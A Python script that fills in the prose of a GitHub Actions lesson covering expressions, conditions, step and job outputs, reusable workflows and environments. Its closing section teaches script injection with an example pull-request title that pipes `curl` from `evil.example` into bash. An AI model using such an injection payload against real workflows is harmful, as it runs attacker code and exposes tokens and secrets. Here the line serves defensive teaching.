"""Book-voice rewrite of d26 (fifth pass, writer td). Replaces prose fields only."""
from common import load, save, set_list, drop_extras

path, P, L = load(6, "d26")

L["goal"] = ("By the end you can make jobs and steps run only when they should, pass values between steps and jobs, "
             "take inputs from the Run workflow button, and move repeated steps into a composite action or a reusable workflow.")

L["opening"] = """Picture the closing routine in our kitchen. A note on the wall says: on Saturdays, the last cook mops the floor. One Saturday a pot of oil tips over at nine o'clock. The house rule says everyone stops at the first problem, so the evening ends early, and nobody mops. It was the one night the floor really needed it.

The note was clear, and its condition was true: it was Saturday. What nobody read was the unwritten rule underneath, "and only if everything has gone well so far". Workflow conditions carry the same invisible rule, and it surprises nearly everyone once.

Last time, our pipeline grew to four checks and a merge rule, and it leaned on a few `${{ }}` pieces we never explained. In this lesson, we'll learn that small language: when GitHub fills it in, how conditions really decide, how jobs hand values to each other, and how to stop repeating ourselves. Before we start, make a guess, and keep it in mind."""

L["guess"]["q"] = ("A step has `if: github.ref == 'refs/heads/main'`, a condition that is true on the main branch. "
                   "The run is on main, and an earlier step in the same job failed. Does the step run?")
L["guess"]["why"] = ("An if without a status function gets success() added, so after a failure the step is skipped. "
                     "Put failure(), always() or !cancelled() in the condition to change that.")

set_list(L["terms"], "plain", [
    "A named set of facts about the run, such as github or steps, that you read inside ${{ }}.",
    "A small formula inside ${{ }} that GitHub works out before the step runs.",
    "One of success(), failure(), cancelled() or always(): a question about what happened earlier in the run.",
    "A named value a step writes to $GITHUB_OUTPUT, read later as steps.<id>.outputs.<name>.",
    "A step output copied up to the job, so other jobs can read it through needs.",
    "Several steps bundled in an action.yml file and used as one step.",
    "A workflow with on: workflow_call that other workflows call in place of a job.",
    "A named place you deploy to, such as production, with its own rules and secrets.",
])

S = L["sections"]

S[0]["h"] = "Two moments: GitHub fills in the blanks, then the shell runs"
S[0]["body"] = """Kitchen tickets often have blanks: "table __, no __". The head chef fills them in just before the cook reads the ticket, so the cook only ever sees finished lines. A workflow file, the YAML file that tells GitHub what to run, is filled in the same way, at two different moments, by different programs.

First, the `${{ ... }}` expressions are worked out and their results pasted into the text. GitHub's servers do this for job-level keys, such as a job's `if:` and `runs-on:`, before any runner (the machine for the job) exists. The runner application does it for each step, just before that step starts.

Second, the shell gets the finished script. The shell is the program that runs commands, bash on Linux, and it expands `$VARIABLES` while it runs. So `run: echo "Branch ${{ github.ref_name }}"` never reaches the shell in that form. On a push to `main`, bash receives `echo "Branch main"`. The expression was replaced before bash even started.

Two things follow from this. The first is that pasted text becomes code. Say an expression holds text that someone else controls, such as a pull request title. A title with a quote mark in it can end your string and add its own commands. It is a guest's note copied onto the ticket as if the chef wrote it. Put such values in `env:` and use `"$TITLE"` in the script, so the shell treats them as data.

The second is that a job-level `if:` is checked before any runner exists. It can only use what GitHub knows at that moment, which is the `github`, `needs`, `vars` and `inputs` contexts. The `env`, `steps` and `runner` contexts do not exist yet, so `if: env.DEPLOY == 'yes'` on a job is an error.

When something behaves strangely, ask which of the two moments you are in. Next, we'll see what those blanks can hold."""

S[1]["h"] = "What the blanks can hold: contexts and expressions"
S[1]["body"] = """A **context** is a named set of facts that GitHub fills in for each run. You read one with an expression, written `${{ ... }}`. These are the ones you will use:

- `github`: the run itself, such as `github.sha`, `github.ref`, `github.event_name`, and the event's data under `github.event`.
- `env`: variables set with `env:` in the workflow, the job or the step.
- `vars` and `secrets`: configuration variables and secrets stored in the repository settings (Day 27).
- `inputs`: values typed into the Run workflow form, or passed to a reusable workflow.
- `matrix`: the values of the current matrix job, such as `matrix.python-version`.
- `steps` and `needs`: results and outputs of earlier steps in this job, and of the jobs this job needs.
- `runner` and `job`: facts about this machine and this job, such as `runner.os` and `job.status`.

A secret is a value such as a password or token that must not appear in logs. The value `github.sha` is the commit's ID, and `github.ref` names the branch or tag the run is about.

Expressions have the usual operators: `==` (equal), `!=` (not equal), `&&` (and), `||` (or) and `!` (not). Strings go in single quotes, and comparisons ignore upper and lower case. A few built-in functions help: `contains()`, `startsWith()`, `format()`, `toJSON()`, `fromJSON()` and `hashFiles()`.

A property that does not exist gives an empty string, not an error. So a typo such as `github.event_nmae` fails quietly on GitHub, and actionlint, the workflow checker from Day 25, is the tool that catches it.

To see what a context really holds, print it once: put `CTX: ${{ toJSON(github) }}` under a step's `env:` and run `echo "$CTX"`. It is the fastest way to learn what an event carries. Do it in a practice workflow only: the `github` context includes `github.token`, and although GitHub masks it in logs, the docs ask you to be careful.

Now we can read the condition from our mopping note properly."""

S[2]["h"] = "Conditions, and the hidden success()"
S[2]["body"] = """Any job or step can have an `if:`. When the expression is false, GitHub skips that job or step. A job skipped this way counts as passed for required checks.

Here is the unwritten rule from the kitchen wall. Every `if:` that does not contain a status function gets an invisible `success()` added to it. A step or job with no `if:` at all behaves the same way. `success()` is true only when everything before it succeeded.

That is how a job stops at its first failure: the later steps are skipped, because their hidden `success()` is now false. So `if: github.ref == 'refs/heads/main'` really means `success() && github.ref == 'refs/heads/main'`, and after a failed step it is false. The floor does not get mopped.

There are four status functions:

- `success()`: everything before succeeded. This is the default.
- `failure()`: something before failed. In a job with `needs`, a failed job anywhere up the chain counts.
- `cancelled()`: the run was cancelled.
- `always()`: true no matter what, even during a cancel.

To run after a failure, say so: `if: ${{ failure() && steps.smoke.outcome == 'failure' }}` runs only when that one step failed. To run whatever happened, prefer `!cancelled()`. **Every if gets a hidden success(). When you mean something else, write the status function yourself.**

GitHub's docs warn against `always()` on important steps. Such a step also runs while the run is being cancelled, and if it gets stuck, it hangs until the timeout. The `always()` function fits small jobs that only report, like the one in today's worked example.

A step can also be allowed to fail with `continue-on-error: true`. Then `steps.<id>.outcome` says `failure`, while `steps.<id>.conclusion` says `success`, and the job carries on. Conditions decide what runs. Next, we'll pass values from one step, or one job, to the next."""

S[3]["h"] = "Notes between steps, and notes between jobs"
S[3]["body"] = """Each step runs in a new shell, and each job runs on a new machine. In the kitchen, a cook can leave a note for the next cook at the same station, but a note for another station has to go through the hatch. Workflows work the same way.

To pass a value along, you append it to one of the files the runner gives every step. When the step ends, the runner reads the file and records what you wrote. The paths are in environment variables, named settings that every step can read:

- `$GITHUB_OUTPUT`: `echo "version=1.4.0" >> "$GITHUB_OUTPUT"` creates a step output. Give the step an `id`, such as `meta`, and later steps read `${{ steps.meta.outputs.version }}`.
- `$GITHUB_ENV`: `echo "IMAGE=hello-devops:ci" >> "$GITHUB_ENV"` sets `$IMAGE` for every later step in the same job. The step that writes it does not see it.
- `$GITHUB_STEP_SUMMARY`: Markdown you append here appears on the run's summary page, so people see results without opening a log.

The `>>` in those commands adds a line to the end of a file. Markdown is the simple text format with `#` for headings and `-` for lists.

Between jobs you need one more hop through the hatch, because jobs share nothing. Under the job's `outputs:`, map a name to a step output. When the job ends, the runner sends those outputs to GitHub, which hands them to every job that `needs` this one. That job reads `${{ needs.version.outputs.version }}`. The diagram shows the whole path.

Outputs are always strings. A step that writes `ok=true` gives the text 'true', so compare with `== 'true'`, or turn it back into a boolean (a true or false value) with `fromJSON()`. For a value with several lines, use the `name<<EOF` form from the workflow commands docs.

And never write a secret to any of these files: outputs and summaries are visible to everyone who can read the run. So far, every value came from inside the run. Next, a person gets to type one in."""

S[4]["h"] = "A form for the Run workflow button"
S[4]["body"] = """`workflow_dispatch` adds a Run workflow button. Add `inputs:` and the button opens a small form; the values land in the `inputs` context. Each input has a type:

- `boolean`: a tick box, `true` or `false`.
- `choice`: a drop-down list built from `options`.
- `string` and `number`: a text field.
- `environment`: a drop-down of the repository's environments.

From the terminal, the same form is `gh workflow run ci.yml -f smoke-test=false`. A workflow can have up to 25 inputs.

The `inputs` context keeps booleans as booleans, while the older `github.event.inputs` turns them into the strings 'true' and 'false'. Use `inputs`.

Now a trap. When the same workflow runs because of a push, `inputs.smoke-test` is empty, not `true`. Defaults apply only to a manual run. Nobody filled in the form, so there is nothing in it.

That is why today's lab writes its condition as `github.event_name != 'workflow_dispatch' || inputs.smoke-test`. On a push or a pull request the first half is true, so the step runs. On a manual run the first half is false, and the tick box decides. The smoke test is a quick start of the built image to see that it answers at all.

Inputs come from people with write access to the repository, so they are more trusted than a PR title. Pass string inputs through `env:` anyway; it costs one line and keeps the habit. With conditions, values and inputs in hand, the file works. It is also getting long, and the next section shortens it."""

S[5]["h"] = "Writing it once: composite actions and reusable workflows"
S[5]["body"] = """Once two jobs repeat the same steps, you want to write those steps once. A kitchen solves this with a sub-recipe card, such as "make the sauce", that any dish can call for. For bigger jobs, one kitchen may borrow another station's whole routine. GitHub has the same two tools, at those two levels.

A composite action bundles steps into a single step. It is a folder with an `action.yml` that says `runs: using: composite` and lists the steps. It can take `inputs` and give `outputs`, and every `run` step inside it must name its `shell`.

You call it like any other action, with `uses:`. For an action in your own repository the path starts with `./`, as in `uses: ./.github/actions/setup-app`. It only works after `actions/checkout`, because the folder must be on the runner. A composite action cannot read the `secrets` context; the caller passes secrets in as inputs.

A reusable workflow is a whole workflow that other workflows call like a function, a named piece of code you can run with different values. Its `on:` lists `workflow_call`, with typed `inputs`, named `secrets` and `outputs`. The caller uses it in place of a job's steps: `uses: ./.github/workflows/build.yml` plus `with:`, and `secrets: inherit` passes along all of the caller's secrets. A few limits apply:

- Calls nest at most 10 levels deep, with at most 50 different reusable workflows in one run.
- The caller's workflow-level `env` does not reach the called workflow. Use inputs or `vars`.
- Token permissions can stay the same or shrink down the chain, never grow.
- The called jobs show up as new checks, so required check names in a ruleset change.

Which one to pick? Steps that run inside one job, such as setup, belong in a composite action. Whole jobs with their own runners, environments or secrets belong in a reusable workflow. In a single repository I prefer to start with a composite action and switch only when I need separate jobs. That leaves one key you will meet in other people's files: `environment:`."""

S[6]["h"] = "Environments: a room with its own rules"
S[6]["body"] = """A restaurant's private dining room has its own rules: the manager approves each dish, and only some staff have the key. GitHub's version is the `environment:` key on a job, as in `environment: production`.

An environment is a named place you deploy to, meaning where a new version goes so people can use it. You set it up under Settings, Environments. It does three things for the jobs that name it:

- Its protection rules run first: required reviewers, a wait timer, or a rule that only certain branches or tags may deploy.
- Its own secrets and variables reach only those jobs, and only after the rules pass.
- Each run is recorded as a deployment, which you can open from the repository page.

So a production password can live in the `production` environment, where a pull request job never sees it. On the Free, Pro and Team plans, required reviewers and wait timers only work in public repositories, and yours is public.

Day 27 uses an environment for real: the release workflow waits for your approval before it pushes an image. Today, just learn to recognise the key when you read other people's workflows.

That points at today's limit. Everything our pipeline does still ends on the runner: it checks, it builds, and then the machine is deleted. No image leaves, and nothing reaches the people who use the app. Day 27 publishes the image, safely."""

L["closing"] = """We started with a floor that never got mopped, because a clear note hid an unwritten rule. You can now read that rule in any workflow: every `if` without a status function quietly adds `success()`. You also know when the blanks are filled in, how values travel between steps and jobs, and how to write repeated steps once.

Open your `ci.yml` and look at each `if:`. For each one, ask what should happen after a failure, and whether the condition says so.

Next, we'll ship. How does a version tag become a published image, behind an approval, without handing the workflow more power than it needs?"""

drop_extras(L)

set_list(L["worked"]["steps"], "say", [
    "Practise in a scratch repository, so hello-devops stays clean. The tool act (Day 25) runs workflows in Docker on your Mac. For shell-only jobs, the `ubuntu:24.04` image you pulled on Day 2 is all it needs. Create the folder and paste `logic-demo.yml` from the Files section, then commit, because act takes `GITHUB_SHA` from your last commit.",
    "Look at the `version` job first. The step writes `version=...` to `$GITHUB_OUTPUT`, and the job's `outputs:` block copies that step output up to the job. Without that block, no other job could see it. This is the note going through the hatch.",
    "`act -l` lists the jobs without running them. The stages come from `needs`: `build` needs `version`, and `report` needs both, so they run one after another.",
    "Run it. On its first run act may ask which default image to use; any answer works, because `-P` picks the image here. The grep keeps only the lines your steps printed. The version made in the first job reaches the second through `needs`, and `build` passed it on to a later step through `$GITHUB_ENV`.",
    "Now tick the box: `--input` fills the `break-build` input, just like the form on GitHub. The step `Fail on purpose` runs and exits 1. Write the summary is skipped, because of the hidden `success()`. `report` still runs, thanks to `always()`, and sees one failure. The order of the list is not fixed and can change between runs.",
    "Turn the `build` job into a reusable workflow. Copy `build.yml` from the Files section: it starts with `on: workflow_call` and declares its two inputs. In `logic-demo.yml`, the job's steps make way for a call with arguments.",
    "Commit and run again. The result is the same, but act now labels the build line `build/build/build`, a name built from the reusable workflow and its jobs. On GitHub, too, the called job's check gets a new name, which is why a ruleset may need updating after this kind of change.",
])

L["task"]["steps"] = [
    "On a branch `workflow-logic`, create `.github/actions/setup-app/action.yml` from the Files section.",
    "In `ci.yml`, replace the setup-python and pip install steps in both the `lint` and `test` jobs with one step that uses `./.github/actions/setup-app`. Keep `actions/checkout` first, and pass the matrix Python version in the test job.",
    "In the `build` job, add a step with `id: meta` that writes `version=0.0.0-ci.` plus the short commit to `$GITHUB_OUTPUT`. Pass it to the image as the `APP_VERSION` build argument, and set `load: true`.",
    "Add the smoke test step (`id: smoke`) that starts the image, waits for `/healthz` and checks that `/` reports the right version. Add the step that prints `docker logs smoke` only when the smoke test failed.",
    "Add the summary step that writes the version and the smoke test result to `$GITHUB_STEP_SUMMARY`, and make it run unless the run was cancelled.",
    "Add the `smoke-test` boolean input to `workflow_dispatch`, and the `if:` on the smoke test that respects it only on manual runs.",
    "Run `actionlint` until it is quiet, then push, open a PR and wait for the four checks. Open the run's summary page and find your version line.",
    "Merge, then run `gh workflow run ci.yml -f smoke-test=false` and check that the smoke test step shows as skipped.",
]
L["task"]["hints"] = [
    "If a step that uses the composite action fails because it cannot find `action.yml`, checkout is missing or comes after it.",
    "actionlint reads your local action, so a misspelled input such as `python-versio` is reported before you push.",
    "On a push, `inputs.smoke-test` is empty. Test `github.event_name` first, as the lesson shows.",
]
L["task"]["done_when"] = ("You are done when a PR run's summary page shows `0.0.0-ci.` plus your commit and \"Smoke test: success\", "
                          "and a manual run with smoke-test off shows the smoke test step as skipped.")

L["explain_back"]["answer"] = ("A step appends a line like version=1.4.0 to the file in $GITHUB_OUTPUT. "
                               "Because the step has an id, later steps can read it as steps.make.outputs.version. "
                               "The job's outputs block maps a job output to that step output, and another job that lists the first one under needs reads it as needs.version.outputs.version. "
                               "GITHUB_ENV only sets variables for later steps on the same runner, and every job runs on a fresh machine, so it cannot carry a value across jobs.")

L["recap"] = [
    "GitHub works out ${{ }} expressions before the shell runs, so pass untrusted text through env.",
    "A job-level if can only use github, needs, vars and inputs; steps, env and runner do not exist yet.",
    "Every if without a status function gets success(); use failure() or !cancelled() to run after a failure.",
    "GITHUB_OUTPUT makes step outputs, a job's outputs block shares them through needs, and GITHUB_ENV only reaches later steps in the same job.",
    "A composite action bundles steps into one step; a reusable workflow bundles whole jobs and can take secrets.",
    "The limit: the pipeline still ends on the runner, and nothing is published until Day 27.",
]

C = L["check"]
C[0]["why"] = "failure() is true only when an earlier step or job failed. A cancel is a different outcome; always() or cancelled() would cover it."
C[1]["why"] = "Other jobs read job outputs through the needs context. steps only covers the current job, and GITHUB_ENV never leaves its runner."
C[2]["why"] = ("Whole jobs with their own runner, environment and secrets are what reusable workflows are for. "
               "A composite action runs inside one job and cannot read secrets itself.")

I = L["interview"]
I[0]["a"] = ("A composite action bundles steps and runs as one step inside a job, so it fits shared setup such as installing a toolchain and restoring caches. "
             "A reusable workflow bundles whole jobs, each with its own runner, environment and secrets, so it fits shared build or deploy pipelines. "
             "Composite actions cannot read secrets themselves and log as one step. "
             "Reusable workflows can nest ten levels deep, do not see the caller's env, and change the names of required checks, so I plan rulesets around them.")
I[1]["a"] = ("GitHub replaces ${{ }} expressions in a run script before the shell starts, so the value becomes part of the script's text. "
             "If the value is controlled by someone else, such as a pull request title or a branch name, a quote in it can end a string and add commands. "
             "The fix is to pass the value through an environment variable and use \"$VAR\" in the script, so the shell treats it as data. "
             "Tools like actionlint flag untrusted values used directly in scripts.")
I[2]["a"] = ("Every if that does not use a status function gets an implicit success() check. "
             "When an earlier step fails, success() is false, so the cleanup is skipped exactly when something went wrong. "
             "To run it after failures too, I write if: ${{ !cancelled() && github.ref == 'refs/heads/main' }}, or failure() if it should only run after a failure.")

L["deeper"]["body"] = """Take a step meant to greet contributors: `run: echo "Thanks for the PR ${{ github.event.pull_request.title }}"`. GitHub pastes the title into the script before bash starts. A normal title gives `echo "Thanks for the PR Fix typo"`. Now someone opens a PR with this title: `x"; curl -s https://evil.example/steal.sh | bash; echo "`. After pasting, the script contains three commands, and the middle one downloads and runs a stranger's script on your runner, with whatever token and secrets that job holds.

This is the guest's note on the kitchen ticket, turned into an order. The fields an outsider controls are the ones to watch. In the `github` context they include titles and bodies of issues and pull requests, comment bodies, commit messages, author names and emails, and branch names (`github.head_ref`). The safe pattern is the one this course has used since Day 24:

1. Put the value in `env:` on the step, as in `TITLE: ${{ github.event.pull_request.title }}`.
2. Use it in the script as `"$TITLE"`, with the double quotes.

Now the shell receives the text as data in a variable, and no quote in it can change the script. The same rule applies to `actions/github-script` and any other place where an expression lands inside code.

You do not have to spot these by eye. actionlint reports them. For that greeting step it prints `"github.event.pull_request.title" is potentially untrusted. avoid using it directly in inline scripts.` and tells you to use an environment variable. Run it before every push, and add it to CI later if you like.

Two more facts make the risk smaller for you today. A pull request from a fork (someone's own copy of your repository) gets no secrets and only a read-only token in a `pull_request` workflow, so the damage is limited. The dangerous combination is untrusted text plus a privileged trigger, such as `pull_request_target`. Day 27 looks at that trigger and why GitHub is starting to block it by default in public repositories. Read GitHub's page on [script injections](https://docs.github.com/en/actions/concepts/security/script-injections) for more examples."""

save(path, P)
print("d26 written")
